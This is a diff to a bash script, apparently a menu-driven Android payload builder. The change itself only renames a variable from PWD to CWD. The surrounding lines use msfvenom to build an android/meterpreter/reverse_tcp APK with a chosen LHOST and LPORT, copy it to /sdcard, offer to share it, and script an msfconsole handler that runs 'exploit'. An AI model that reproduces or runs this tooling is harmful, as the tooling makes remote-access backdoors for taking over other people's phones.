@@ -62,7 +62,7 @@ else
 printf "\033[1;32m[\033[1;31m!\033[1;32m]\033[1;31mEnter a valid option!\033[0m\n"
 fi
 done
-PWD=$(pwd)
+CWD=$(pwd)
 while true; do
 printf "\e[1;31mYou are generating payload for (LAN/WAN) ==> \e[1;92m"
 read lwan
@@ -111,7 +111,7 @@ elif [[ $lwan == WAN ]] || [[ $lwan == wan ]]; then
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$flht LPORT=$flpt R>${pld}.apk /sdcard
 fi
 sleep 5
-cd $PWD
+cd $CWD
 mv -v ${pld}.apk /sdcard
 sleep 0.5
 printf "\n"
@@ -131,11 +131,11 @@ echo
 if [[ $option == 1 ]] || [[ $option == 01 ]]
 then
 cd /sdcard && xdg-open --send ${pld}.apk
-cd $PWD
+cd $CWD
 elif [[ $option == 2 ]] || [[ $option == 02 ]]
 then
 cd /sdcard && xdg-open ${pld}.apk
-cd $PWD
+cd $CWD
 elif [[ $option == 3 ]] || [[ $option == 03 ]]
 then
 mkdir -p $PREFIX/tmp
@@ -153,14 +153,14 @@ echo "exploit" >> run
 msfconsole -r run
 cd - &> /dev/null
 cd $PRIFIX/tmp; rm -rf run
-cd $PWD
+cd $CWD
 elif [[ $option == 4 ]] || [[ $option == 04 ]]
 then
 cd $HOME && cd /sdcard && rm -rf ${pld}.apk
-cd $PWD
+cd $CWD
 elif [[ $option == quit ]]
 then
-unset PWD
+unset CWD
 exit
 else
 printf "(•) \e[1;31m>>>please choose a valid option\e[0m\n"
